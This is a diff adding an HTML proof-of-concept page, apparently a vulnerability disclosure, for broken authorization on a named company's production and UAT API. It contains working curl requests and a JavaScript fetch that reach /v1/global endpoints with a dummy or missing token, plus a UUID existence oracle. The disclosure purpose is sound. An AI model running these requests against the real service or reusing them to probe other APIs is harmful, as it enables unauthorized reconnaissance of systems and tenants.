@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PoC — api.sparelabs.com: /v1/global/* auth presence-only (prod + UAT)</title>
+<style>
+ body{font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;background:#0f1115;color:#e6edf3;max-width:860px;margin:2rem auto;padding:0 1rem}
+ h1{font-size:1.35rem}h2{font-size:1.05rem;margin-top:2rem}
+ pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.8rem;overflow:auto;font-size:12.5px}
+ .ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
+ table{border-collapse:collapse;width:100%}
+ td,th{border:1px solid #30363d;padding:.4rem .6rem;text-align:left;font-size:13px}
+ button{background:#238636;border:0;color:#fff;padding:.45rem .9rem;border-radius:6px;cursor:pointer}
+</style>
+</head>
+<body>
+<h1>api.sparelabs.com — Broken Object-Level Authorization: /v1/global controller (no/ presence-only auth)</h1>
+<p class="dim">Class: OWASP API1 (BOLA/BFLA) · Route-level auth omission on GET · verified prod + UAT · control routes correctly 401.</p>
+
+<h2>Live reproduction (client-side fetch from this page)</h2>
+<button id="run">Run</button>
+<pre id="out">idle.</pre>
+
+<h2>Server-side truth (curl, run by any unauthenticated client)</h2>
+<pre><span class="ok"># 1) Header PRESENCE only — any value grants access, prod AND UAT:</span>
+curl -s https://api.sparelabs.com/v1/global/regions  -H "Authorization: Bearer x"
+# &gt; [{"name":"CA",...,"routingHost":"https://routing.sparelabs.com"}, ... {"name":"UAT","apiUrl":"https://api.uat.sparelabs.com",...}]
+
+curl -s https://api.sparelabs.com/v1/global/regions  # no header → 400 "Authorization header required"
+
+<span class="ok"># 2) COOKIE-free GET allowed without ANY token:</span>
+curl -s https://api.sparelabs.com/v1/global/organizations                        # 200 {"data":[]}
+curl -s https://api.uat.sparelabs.com/v1/global/organizations                    # 200 {"data":[]}  (UAT mirror)
+
+<span class="ok"># 3) UUID existence oracle (400 vs 404):</span>
+curl -o /dev/null -w '%{http_code}' "https://api.sparelabs.com/v1/public/organization?organizationId=not-a-uuid"                              # 400 ValidationError
+curl -o /dev/null -w '%{http_code}' "https://api.sparelabs.com/v1/public/organization?organizationId=00000000-0000-0000-0000-000000000000"     # 404 NotFoundError
+
+<span class="bad"># 4) CONTROL — proper gate exists elsewhere:</span>
+curl -o /dev/null -w '%{http_code}' https://api.sparelabs.com/v1/journeys         # 401 (InvalidTokenError)
+curl -o /dev/null -w '%{http_code}' https://api.sparelabs.com/v1/riders           # 401</pre>
+<p class="dim">Impact: unauthenticated disclosure of platform region/UAT topology; tenant-UUID Boolean oracle at zero privilege; auth middleware performs header-presence check on GET /v1/global/* while token VALIDITY enforcement (which exists on every other controller) never runs.</p>
+
+<script>
+async function run(){
+ const url="https://api.sparelabs.com/v1/global/regions";
+ const out=document.getElementById('out'); const lines=[];
+ try{
+   const r=await fetch(url,{headers:{Authorization:"Bearer x"}});
+   lines.push(`fetch /v1/global/regions (dummy token) -> HTTP ${r.status}`);
+   lines.push("body: "+ (await r.text()).slice(0,400));
+ }catch(e){ lines.push("fetch failed (expected if CORS blocks from this origin): "+e); }
+ try{
+   const r2=await fetch("https://api.sparelabs.com/v1/global/organizations");
+   lines.push(`fetch /v1/global/organizations (no token) -> HTTP ${r2.status} body: ${(await r2.text()).slice(0,120)}`);
+ }catch(e){ lines.push("org fetch failed: "+e); }
+ out.textContent=lines.join("\n");
+}
+document.getElementById('run').addEventListener('click',run);
+</script>
+</body>
+</html>
